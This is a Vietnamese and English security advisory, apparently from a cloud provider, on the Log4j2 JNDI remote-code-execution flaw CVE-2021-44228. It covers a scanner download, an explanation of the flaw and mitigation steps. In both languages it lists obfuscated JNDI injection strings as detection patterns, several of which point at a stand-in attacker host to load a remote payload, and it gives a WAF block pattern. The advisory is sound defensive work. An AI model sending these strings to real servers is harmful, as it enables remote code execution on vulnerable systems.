# \[vServer]-\[CVE-2021-44228] Apache Log4j2 0day being exploited

#### Severity: Critical <a href="#id-vserver-cve-2021-44228-apachelog4j20daybeingexploited-severity-critical" id="id-vserver-cve-2021-44228-apachelog4j20daybeingexploited-severity-critical"></a>

\


CVSSv3.1 Base Score: 10 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).

_**\[Cập nhật 18:00 13 Dec 2021]**_

VNG CLoud đã phân phối bản rà soát các class log4j hỗ trợ quản trị viên có thể tự kiểm tra trên server của mình.

Download link: [https://hcm01.vstorage.vngcloud.vn/v1/AUTH\_6b6d88f56ab94dc9aa7e2b389d2774b1/ShareKH/local-log4j-vuln-scanner-bin.zip](https://hcm01.vstorage.vngcloud.vn/v1/AUTH\_6b6d88f56ab94dc9aa7e2b389d2774b1/ShareKH/local-log4j-vuln-scanner-bin.zip)

\


| Filename                       | Description                                                                                                                                                                                |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| local-log4j-vuln-scanner       | Mach-O 64-bit executable x86\_64                                                                                                                                                           |
| local-log4j-vuln-scanner-386   | ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, Go BuildID=aHccX3XDbjmndAIPvdws/wvkQOEsJaqFqBICg5lF4/5kKfgxf\_gsdVkXxNqwea/C7jOtcP5IHKqn-1-CAWX, not stripped |
| local-log4j-vuln-scanner-amd64 | ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=1Z0J0SYBA-Qdo8\_BLC7s/jlodzy-qFJ9W9yB-8iVj/cwKx2dU4R5l1PQjub9ha/ma0o2d9jsRHeS4rlnUi2, not stripped      |
| local-log4j-vuln-scanner.exe   | PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows                                                                                                               |
| patterns.csv                   | Log4j class pattern                                                                                                                                                                        |

Đối với server x64:

| <p>unzip local-log4j-vuln-scanner-bin.zip</p><p>cd local-log4j-vuln-scanner-bin</p><p>./local-log4j-vuln-scanner-amd64 &#x3C;/path/to/app1> &#x3C;/path/to/app2></p> |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

\


Đối với server x32:

| <p>unzip local-log4j-vuln-scanner-bin.zip</p><p>cd local-log4j-vuln-scanner-bin</p><p>./local-log4j-vuln-scanner-386 &#x3C;/path/to/app1> &#x3C;/path/to/app2></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

\


Đối với server MacOS:

| <p>unzip local-log4j-vuln-scanner-bin.zip</p><p>cd local-log4j-vuln-scanner-bin</p><p>./local-log4j-vuln-scanner &#x3C;/path/to/app1> &#x3C;/path/to/app2></p> |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------- |

\


Đối với server Windows, dùng powershell unzip gói local-log4j-vuln-scanner-bin.zip

| <p>cd local-log4j-vuln-scanner-bin</p><p>local-log4j-vuln-scanner.exe &#x3C;/path/to/app1> &#x3C;/path/to/app2></p> |
| ------------------------------------------------------------------------------------------------------------------- |

\


\


\


\------------------------------------------------------------------------------------------------------------------------

Tính năng JNDI của Apache Log4j2 <=2.14.1 JNDI sử dụng trong cấu hình, log,  và tham số không được bảo vệ dẫn đến việc kẻ tấn công có thể cấu hình LDAP và các endpoints khác của JNDI. Kẻ tấn công có thể thay đổi log và tham số log, có thể thực thi mã trái phép được nạp từ LDAP servers khi tính năng "message lookup substitution" được bật (LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS).&#x20;

&#x20;Kẻ tấn công có thể khai thác lỗi này bằng các gửi một "crafted request" đến server, sử dụng JNDI qua các dịch vụ:

* Lightweight Directory Access Protocol (LDAP)
* Secure LDAP (LDAPS)
* Remote Method Invocation (RMI)
* Domain Name Service (DNS)
* &#x20;Dịch vụ khác: NIS, IIOP, CORBAL, NDS, HTTP

Nếu server sử dụng log4j để log các request, mã khai thác sẽ được thực thi qua JNDI qua các service trên. Khai thác thành công có thể giúp kẻ tấn công thực thi mã độc từ xa trên server.

Phiên bản 2.15.0, tính năng này đã được mặc định tắt.

Một số phần mềm bị mắc phải lỗi trên bao gồm nhưng không giới hạn:

* [Apache Druid](https://druid.apache.org/docs/latest/configuration/logging.html)
* [Apache Flink](https://nightlies.apache.org/flink/flink-docs-master/docs/deployment/advanced/logging/)
* [Apache Solr](https://solr.apache.org/guide/6\_6/configuring-logging.html)
* [Apache Spark](https://spark.apache.org/docs/2.4.2/configuration.html#configuring-logging)
* [Apache Struts2](https://struts.apache.org/maven/struts2-plugins/struts2-convention-plugin/dependencies.html)
* Apache Tomcat

RedTeam đã viết thành công mã khai thác lỗ hổng này, đã tấn công thành công vào một số product cốt lõi.

Để truy vết tấn công, quản trị viên có thể tham khảo pattern:

| <pre><code>j${k8s:k5:-ND}i${sd:k5:-:}

j${main:\k5:-Nd}i${spring:k5:-:}

j${sys:k5:-nD}${lower:i${web:k5:-:}}

j${::-nD}i${::-:}

j${EnV:K5:-nD}i:

${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}attacker_controled_website/payload_to_be_executed}

j${loWer:Nd}i${uPper::}

${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker_controled_website/payload_to_be_executed }

${jndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker_controled_website/payload_to_be_executed}

${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}attacker_controled_website/payload_to_be_executed}

${jndi:${lower:l}${lower:d}ap://attacker_controled_website/payload_to_be_executed}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker_controled_website/payload_to_be_executed}

${${::-j}ndi:

${${::-j}nd${::-i}:

${en${lower:v}:ENV_NAME:-j}

${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:j}}}}}}}}}}}}}
</code></pre> |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

\


\


local-log4j-vuln-scanner-bin.zip

\
Khuyến nghị quản trị viên cần làm những công việc sau để giảm thiểu rủi ro với server:&#x20;

1. Đối với log4j2 >=2.10 , cấu hình system property "**log4j2.formatMsgNoLookups**" thành "true" hoặc\
   set biến môi trường **LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS** thành true\
   \

2. Đối với log4j2 từ  2.0-beta9 đến 2.10.0&#x20;
   1. Xoá **JndiLookup** class trong classpath\
      (ví dụ: zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class)\
      \

3. Cập nhật bản vá  [https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)\
   \

4. Quản trị viên Kubernetes có thể dùng “kubectl set env” để cấu hình biến LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=”true”  và áp dụng cho Kubernetes clusters  đang chạy Log4j 2.10 đến 2.14.1.\
   \

5.  Build lại  JndiLookup class  thành class rỗng và patch:

    \
    package org.apache.logging.log4j.core.lookup;

    public class JndiLookup {}

    add log4j-patch.jar to application library path\
    \

6.  Tắt Jndi nếu không sử dụng

    Tạo spring.properties file trong src/main/resources  và thêm spring.jndi.ignore=true\
    \

7.  &#x20;Đối với Docker:

    &#x20;cấu hình biến môi trường ENV LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true or flag

    \


    \


    \


    \


    &#x20;hoặc cấu hình ENV trong compose file

    \


    \


    | <p>web:</p><p>  environment:</p><p>    - LOG4J_FORMAT_MSG_NO_LOOKUPS=true</p> |
    | ----------------------------------------------------------------------------- |
8.  Đối với Kubernetes\


    \


    | <p>spec:</p><p>      containers:</p><p>             - name: ...</p><p>                image: ...</p><p>                env:</p><p>                - name: LOG4J_FORMAT_MSG_NO_LOOKUPS</p><p>                   value: "true"</p> |
    | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
9.  Đối với WAF, sử dụng pattern cho alert hoặc block:&#x20;

    ${jndi:${lower:l}${lower:d}ap://\<SERVER>/\<payload>}

    \

10. Một cách vá lỗi khác để giảm thiểu ảnh hưởng\
    echo "export LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true" >> /etc/profile.d/blockzero.sh\
    \

11. Đối với AWS WAF và CloudFront: [https://github.com/OllieJC/aws-log4j-mitigations\
    ​​​​​​​](https://github.com/OllieJC/aws-log4j-mitigations)

Thông tin chi tiết các anh chị/các bạn có thể xem thêm:&#x20;

[https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)

[https://github.com/advisories/GHSA-jfh8-c2jp-5v3q](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)

\--------------------------------------------------------------------------------------------------------------------------------------

Log4j – Apache Log4j Security Vulnerabilities

\
[logging.apache.org](http://logging.apache.org/)\
Apache Log4j Security Vulnerabilities. This page lists all the security vulnerabilities fixed in released versions of Apache Log4j 2. Each vulnerability is given a ...

Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

An unauthenticated, remote attacker could exploit this flaw by sending a specially crafted request to a server running a vulnerable version of log4j. The crafted request uses a Java Naming and Directory Interface (JNDI) injection via a variety of services including:

* Lightweight Directory Access Protocol (LDAP)
* Secure LDAP (LDAPS)
* Remote Method Invocation (RMI)
* Domain Name Service (DNS)
* Other: NIS, IIOP, CORBAL, NDS, HTTP

If the vulnerable server uses log4j to log requests, the exploit will then request a malicious payload over JNDI through one of the services above from an attacker-controlled server. Successful exploitation could lead to RCE.

From log4j 2.15.0, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to “true” or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see [https://www.oracle.com/java/technologies/javase/8u121-relnotes.html](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)) protects against remote code execution by defaulting "com.sun.jndi.rmi.object.trustURLCodebase" and "com.sun.jndi.cosnaming.object.trustURLCodebase" to "false".

Affected software includes but not limited to:

* [Apache Druid](https://druid.apache.org/docs/latest/configuration/logging.html)
* [Apache Flink](https://nightlies.apache.org/flink/flink-docs-master/docs/deployment/advanced/logging/)
* [Apache Solr](https://solr.apache.org/guide/6\_6/configuring-logging.html)
* [Apache Spark](https://spark.apache.org/docs/2.4.2/configuration.html#configuring-logging)
* [Apache Struts2](https://struts.apache.org/maven/struts2-plugins/struts2-convention-plugin/dependencies.html)
* Apache Tomcat

RedTeam have successfully exploit this vulnerabilities and found multiple affected servers in core products.

Attack pattern looks like:

\


| <pre><code>j${k8s:k5:-ND}i${sd:k5:-:}

j${main:\k5:-Nd}i${spring:k5:-:}

j${sys:k5:-nD}${lower:i${web:k5:-:}}

j${::-nD}i${::-:}

j${EnV:K5:-nD}i:

${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}attacker_controled_website/payload_to_be_executed}

j${loWer:Nd}i${uPper::}

${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker_controled_website/payload_to_be_executed }

${jndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker_controled_website/payload_to_be_executed}

${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}attacker_controled_website/payload_to_be_executed}

${jndi:${lower:l}${lower:d}ap://attacker_controled_website/payload_to_be_executed}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker_controled_website/payload_to_be_executed}

${${::-j}ndi:

${${::-j}nd${::-i}:

${en${lower:v}:ENV_NAME:-j}

${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:j}}}}}}}}}}}}}
</code></pre> |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

\


We recommend  system administrator to follow below workaround:

1. &#x20;For log4j2 >=2.10, setting system property "**log4j2.formatMsgNoLookups**" to “**true**” or set environment variable **LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS** to **true**\
   \

2. For log4j2 from 2.0-beta9 to 2.10.0  update by removing the **JndiLookup** class from the classpath:\
   zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\
   \

3. Update patch [https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)\
   \

4. &#x20;Kubernetes administrators may use “kubectl set env” to set the LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=”true” environment variable to apply the mitigation across Kubernetes clusters where the Java applications are running Log4j 2.10 to 2.14.1, effectively reflecting on all pods and containers automatically.\
   \

5.  &#x20;Rebuild empty class and patch:

    package org.apache.logging.log4j.core.lookup;

    public class JndiLookup {}

    add log4j-patch.jar to application library path\
    \

6.  Disable Jndi if not use

    create a spring.properties file in src/main/resources (ignore if already created) and add this value spring.jndi.ignore=true\
    \

7.  \


    \


    Docker

    \


    \


    use env: ENV LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true or flag

    \


    CMD \["java", "-Dlog4j.formatMsgNoLookups=true", "-jar", "..."]

    \


    or set ENV in compose file

    \


    web:

    &#x20; environment:

    &#x20;   \- LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true

    \

8.  WAF pattern for alert or block:

    ${jndi:${lower:l}${lower:d}ap://\<SERVER>/\<payload>}\
    \

9.  Other than patches it is possible to mitigate through configuration change.

    echo "export LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true" >> /etc/profile.d/blockzero.sh\
    \

10. For AWS WAF and CloudFront (be mindful of bypasses): [https://github.com/OllieJC/aws-log4j-mitigations](https://github.com/OllieJC/aws-log4j-mitigations)​​​​​​​

More details on this vulnerability:

[https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)

[https://github.com/advisories/GHSA-jfh8-c2jp-5v3q](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
